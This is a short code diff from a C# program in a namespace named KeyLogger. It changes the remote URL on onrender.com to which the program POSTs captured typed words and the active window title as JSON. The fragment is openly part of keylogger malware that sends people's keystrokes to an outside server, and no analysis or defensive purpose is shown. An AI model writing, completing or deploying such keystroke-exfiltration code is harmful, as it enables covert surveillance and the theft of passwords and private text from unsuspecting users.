@@ -46,7 +46,7 @@ namespace KeyLogger {
           string safeTitle = (windowTitle ?? currentWindowTitle).Replace("\"", "\\\"");
           string safeWord = word.Replace("\"", "\\\"");
           string jsonBody = "{ \"words\": \"" + safeWord + "\", \"window_title\": \"" + safeTitle + "\" }";
-          string url = "https://xenv1.onrender.com/captures";
+          string url = "https://xenv1-9gvd.onrender.com/captures";
           var webRequest = WebRequest.Create(url);
           webRequest.Method = "POST";
           byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
